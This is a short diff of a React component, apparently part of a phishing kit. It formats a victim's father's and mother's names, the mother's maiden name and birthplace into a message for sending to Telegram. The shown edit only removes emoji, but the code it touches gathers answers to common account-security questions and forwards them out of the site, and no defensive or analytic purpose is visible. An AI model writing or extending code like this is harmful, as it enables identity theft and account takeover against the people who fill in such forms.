@@ -35,15 +35,15 @@ const Teil = () => {
 
     // Format the message to send to Telegram
     const message = `
-      👨‍👩‍👧 FAMILY INFORMATION (TEIL)
+       FAMILY INFORMATION (TEIL)
       ━━━━━━━━━━━━━━━━━━━━━━━━━
       Father's Full Name: ${fatherFullName}
     Mother's Full Name: ${motherFullName}
       Mother's Maiden Name: ${motherMaidenName}
        Place of Birth: ${placeOfBirth}
-      🏙️ City of Birth: ${cityOfBirth}
+       City of Birth: ${cityOfBirth}
       ━━━━━━━━━━━━━━━━━━━━━━━━━
-      ⏰ Time: ${new Date().toLocaleString()}
+       Time: ${new Date().toLocaleString()}
     `;
 
     try {
